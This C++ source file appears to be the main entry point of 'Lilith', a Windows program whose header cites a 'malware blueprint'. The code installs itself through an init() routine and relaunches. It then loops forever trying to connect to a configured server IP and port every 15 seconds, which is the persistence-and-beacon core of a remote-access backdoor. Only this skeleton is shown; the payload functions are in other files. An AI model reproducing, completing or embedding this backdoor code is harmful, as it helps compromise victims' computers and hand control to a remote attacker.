/* 							LILITH 						*/
/*				PROJECT CREATION DATE: 15.06.16			*/
/* 				BY NICK RAZIBORSKY AKA WERKAMSUS		*/

/*

			FEATURE IDEAS: 'GDRIVE\init0\malware blueprint.txt'

*/

/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/

#include "general.h"


#if _DEBUG
//TESTFUNC

void testMB(std::string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC

#endif

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//VARIABLE SETUP
	General::lpArguments = lpCmdLine;


	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
		return 0;


	Client MyClient(Settings::serverIP, Settings::serverPort); //Client

	while (true)
	{




		if (!MyClient.connected)
		{
			while (!MyClient.Connect())
			{
				Sleep(15000);
			}
		}
		Sleep(15000);
	}



	return 0;
}